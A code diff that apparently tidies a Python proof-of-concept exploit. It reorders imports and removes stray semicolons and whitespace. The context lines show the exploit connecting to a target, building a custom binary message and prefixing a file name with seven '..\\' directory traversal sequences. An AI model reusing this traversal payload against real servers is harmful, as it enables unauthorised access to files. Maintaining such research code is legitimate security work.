@@ -1,5 +1,9 @@
-import socket, argparse, hexdump
+import argparse
+import socket
 from struct import *
+
+import hexdump
+
 
 def dump(title, data):
   print('[-- %s --]' % (title))
@@ -8,7 +12,7 @@ def dump(title, data):
 def mk_msg(type, flags, data, dlen=None):
   if dlen == None:
     dlen = len(data)
-  hdr = pack('>HHL', type, flags, dlen);
+  hdr = pack('>HHL', type, flags, dlen)
   msg = hdr + data
   return msg
 
@@ -33,7 +37,7 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((target, port))
 s.settimeout(5)
 
-req = pack('<L', 0x100);
+req = pack('<L', 0x100)
 dump('req', req)
 s.sendall(req)
 res = s.recv(4096)
@@ -42,12 +46,12 @@ dump('res', res)
 fname = '..\\' * 7  + fname
 files = [fname]
 data  = pack('>L', 0xaa)
-data += b'unk_str1\x00' 
+data += b'unk_str1\x00'
 data += pack('>L', len(files))
 
 for f in files:
-  data += f.encode() + b'\x00' 
-  
+  data += f.encode() + b'\x00'
+
 req = mk_msg(21, 0x0021, data)
 dump('req (up to 0x100 bytes)', req[:0x100])
 try:
